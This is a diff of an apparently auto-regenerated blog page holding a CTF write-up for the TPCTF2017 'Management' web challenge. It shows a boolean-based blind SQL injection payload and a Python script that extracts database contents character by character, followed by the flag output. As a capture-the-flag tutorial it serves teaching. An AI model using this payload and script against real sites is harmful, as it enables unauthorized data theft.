@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="format-detection" content="telephone=no,email=no,adress=no">
   <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
+  <meta name="theme-color" content="#000000">
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+  <meta http-equiv="window-target" content="_top">
   
   <title>[Web] TPCTF2017 - Management | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="Management60I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?Second instance r">
@@ -44,7 +44,7 @@
 
   <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
 
 <body class="main-center">
   <section class="mainside">
@@ -65,7 +65,7 @@
 
     <form class="search-form sidebar-form">
         <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <input type="text" class="search-form-input form-control" placeholder="Search">
             <span class="input-group-btn">
                 <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
             </span>
@@ -75,7 +75,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech="">
             <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
         </div>
@@ -162,11 +162,11 @@
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="fa fa-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="fa fa-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="fa fa-rss"></i></a></li>
         
     </ul>
     
@@ -331,7 +331,7 @@
   
   <section class="main">
   <div class="content">
-  <article id="post-Web-TPCTF2017-Management" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Web-TPCTF2017-Management" class="article article-type-post" itemscope="" itemprop="blogPost">
     
     <header class="article-header">
       
@@ -370,7 +370,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 431 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 523 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 3 (min)</span>
@@ -382,15 +382,15 @@
       
         <blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>
 
-<p>Opening the website we can see we can choose the user:<br><a data-fancybox="gallery" href="https://i.imgur.com/z4dn6bc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/z4dn6bc.png" alt=""><br></a></p>
-<p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</div></pre></td></tr></table></figure>
+<p>Opening the website we can see we can choose the user:<br><a data-fancybox="gallery" href="https://i.imgur.com/z4dn6bc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/z4dn6bc.png" alt=""><br></a></p>
+<p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</span><br></pre></td></tr></table></figure>
 <p>It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></span><br></pre></td></tr></table></figure>
 <p>It’s important to use <code>HEX</code> function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page <strong>Result: 1</strong> if it’s false it will return <strong>Result: 0</strong>, doing this by hand is tedious so I wrote a python script to automate the stuff:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">url=<span class="string">'http://52.90.229.46:8558'</span></div><div class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></div><div class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></div><div class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></div><div class="line"></div><div class="line">name = <span class="string">''</span></div><div class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</div><div class="line">    name = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</div><div class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></div><div class="line">            <span class="comment">#print PAYLOAD</span></div><div class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</div><div class="line">                <span class="comment">#print '-----------------------------------'</span></div><div class="line">                name += l</div><div class="line">                <span class="keyword">print</span> name</div><div class="line">                stop = <span class="keyword">False</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> stop:        </div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="comment">#if(1=1,sleep(6),0)</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://52.90.229.46:8558'</span></span><br><span class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></span><br><span class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></span><br><span class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</span><br><span class="line">        stop = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</span><br><span class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></span><br><span class="line">            <span class="comment">#print PAYLOAD</span></span><br><span class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment">#print '-----------------------------------'</span></span><br><span class="line">                name += l</span><br><span class="line">                <span class="keyword">print</span> name</span><br><span class="line">                stop = <span class="keyword">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> stop:        </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#if(1=1,sleep(6),0)</span></span><br></pre></td></tr></table></figure>
 <p>Running it</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">$ python management.py </div><div class="line">f</div><div class="line">fl</div><div class="line">fla</div><div class="line">flag</div><div class="line">flag&#123;</div><div class="line">flag&#123;a</div><div class="line">flag&#123;aL</div><div class="line">flag&#123;aLW</div><div class="line">flag&#123;aLW4</div><div class="line">flag&#123;aLW4y</div><div class="line">flag&#123;aLW4ys</div><div class="line">flag&#123;aLW4ys_</div><div class="line">flag&#123;aLW4ys_E</div><div class="line">flag&#123;aLW4ys_ES</div><div class="line">flag&#123;aLW4ys_ESC</div><div class="line">flag&#123;aLW4ys_ESC4</div><div class="line">flag&#123;aLW4ys_ESC4P</div><div class="line">flag&#123;aLW4ys_ESC4PE</div><div class="line">flag&#123;aLW4ys_ESC4PE_</div><div class="line">flag&#123;aLW4ys_ESC4PE_3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3r</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rY</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYT</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1N</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ python management.py </span><br><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;a</span><br><span class="line">flag&#123;aL</span><br><span class="line">flag&#123;aLW</span><br><span class="line">flag&#123;aLW4</span><br><span class="line">flag&#123;aLW4y</span><br><span class="line">flag&#123;aLW4ys</span><br><span class="line">flag&#123;aLW4ys_</span><br><span class="line">flag&#123;aLW4ys_E</span><br><span class="line">flag&#123;aLW4ys_ES</span><br><span class="line">flag&#123;aLW4ys_ESC</span><br><span class="line">flag&#123;aLW4ys_ESC4</span><br><span class="line">flag&#123;aLW4ys_ESC4P</span><br><span class="line">flag&#123;aLW4ys_ESC4PE</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3r</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rY</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYT</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1N</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!</span><br><span class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -456,7 +456,7 @@
   
 </div>
 
-  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <nav class="bar bar-footer clearfix" data-stick-bottom="">
   
   <ul class="pager pull-left">
     
